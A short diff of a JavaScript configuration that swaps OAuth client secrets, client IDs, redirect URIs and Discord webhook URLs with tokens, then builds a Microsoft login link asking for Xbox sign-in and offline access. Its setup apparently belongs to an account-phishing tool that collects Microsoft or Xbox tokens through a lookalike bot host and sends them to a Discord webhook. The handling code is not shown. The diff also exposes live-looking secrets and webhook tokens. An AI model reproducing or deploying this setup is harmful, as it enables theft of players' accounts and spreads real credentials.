@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
-const redirect_uri = 'https://skyhelperbot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
+const client_secret = 'Et18Q~8allVlX1R6QXZCiQOQ5nz5Jol1Q3yfjaCv' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '82533e0f-9790-4fc6-b631-442b139fbe6b'
+const redirect_uri = 'https://oauth-blb2.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1049343570907234385/tUm1IthkDcs1BcDWBT57Qn_XP1eZU3A-SFUDL9IZwws_jvB4GmFE2GhIOHS0sL7Uvw7c'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
